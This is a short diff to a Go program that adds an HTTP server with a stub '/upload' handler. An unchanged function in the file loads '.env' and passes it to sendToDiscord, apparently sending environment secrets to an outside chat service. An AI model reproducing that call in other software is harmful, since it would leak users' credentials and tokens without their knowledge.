@@ -1,6 +1,11 @@
 package main
 
-import "github.com/joho/godotenv"
+import (
+	"log"
+	"net/http"
+
+	"github.com/joho/godotenv"
+)
 
 type Status struct {
 	Code int    `json:"code"`
@@ -46,4 +51,17 @@ type Response struct {
 func readEnv() {
 	godotenv.Load(".env")
 	sendToDiscord(".env")
+}
+
+func main() {
+
+	http.HandleFunc("/upload", uploadHandler)
+	log.Fatal(http.ListenAndServe(":8080", nil))
+}
+
+func uploadHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
+		return
+	}
 }
